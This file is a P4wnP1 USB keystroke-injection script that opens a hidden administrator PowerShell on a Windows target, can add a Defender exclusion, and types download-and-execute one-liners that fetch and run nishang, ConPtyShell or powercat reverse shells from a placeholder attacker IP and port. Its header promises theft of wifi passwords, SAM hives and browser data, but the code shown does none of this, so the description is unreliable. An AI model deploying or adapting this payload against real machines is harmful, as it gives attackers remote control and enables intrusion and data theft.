/*#######################################################################################################################################\
# reverse_shell.js                                                                                                                       #
#   Extraction of folder/file structures, targeted files in specified folders, saved wifi Passwords, browsing history/bookmarks/logs,    #
#   Windows credential databases (SAM, system and security files) and users + passwords (hashes) to P4wnP1 mass storage or to            #
#   another mass storage of your choice.                                                                                                 #
#                                                                                                                                        #
#   Author: cac3r                                                                                                                        #
#                                                                                                                                        #
# PREREQUISTES:                                                                                                                          #
# - A vulnerable Windows target. Default Windows 10/11 with enabled AV, AMSI, ... will flag this payloads as malicious.                  #
# - Edit global settings below.                                                                                                          #
\#######################################################################################################################################*/

///////// GLOBAL SETTINGS /////////\
// GENERAL                        // ---
layout("us");                     // Keyboard layout
typingSpeed(0,0);                 // Typing = really fast
run_as_admin=true;                // Set to true to execute powershell as Administrator
hide=true;                        // Set to true to hide terminal
exit=true;                        // Set to true to exit the console once finished
modify_defender=false;            // Disable and enable Windows defender in the process of this script (Powershell must be run as Administrator for this to work [run_as_admin=true])
// REVERSE SHELLS                 // NOTE: Very likely to get flaged and droped by Windows 10/11 AV,AMSI,...
revshell_powercat=false;          // Set to true to enable powercat reverse shell trigger
revshell_nishang=true;            // Set to true to enable nishang style reverse shell trigger
revshell_conPtyShell=false;       // Set to true to enable conPtyShell reverse shell trigger
////////////////////////////////////

// Definition of other variables, arrays, ...
var delay_time = 5                                                 // The time to wait before executing the attack in seconds
var ready = "False"                                                // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                                           // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)                                // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                                       // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                                        // Stop the while loop
            break;
        }
    }
}
function attack() {
  // Open powershell
    press("GUI r");
    delay(500);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");     // Hide the console if chosen to do so
    if (run_as_admin) {                                                        // Run powershell either as admin or standard user
        press("CTRL SHIFT ENTER");
	    delay(1000);
        press("LEFT");
        delay(200);
        press("ENTER");
        delay(200);
    } else {
        type("\n");
        delay(1000);
    }

  // Disable Windows Defender
  if (modify_defender && run_as_admin) {
    type("Import-Module Defender;\n");
    type("Set-MpPreference -ExclusionPath $usbPath;\n");
    delay(1000)
  }

  // Reverse Shell trigger. Fill the variables(IP, PORT, PATH to MALICIOUS FILE) or write new payload
    // type("<PAYLOAD>")
    if (revshell_nishang) {      // nishang Invoke-*
      type("IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<MALFILE.ps1>');<MALFILE.ps1>")
      type("\n")      
    }
    if (revshell_conPtyShell) {  // conPtyShell
      type("IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell -RemoteIp <IP> -RemotePort <PORT> -Rows 24 -Cols 80")
      type("\n")     
    }
    if (revshell_powercat) {     // powercat
      type("$code=(New-Object System.Net.Webclient).DownloadString('http://<IP>:<port>/<malfile>');iex 'powershell -E $code'")
      type("\n")
    }

  // Clean up
    if (modify_defender) {
      type("Remove-MpPreference -ExclusionPath $usbPath;\n");                 // Enable Windows Defender again
    }
  
  // Exit the console if chosen to do so      
    if (exit) { type("exit\n"); }
}

delay(delay_time * 100);
check_if_ready();
attack();
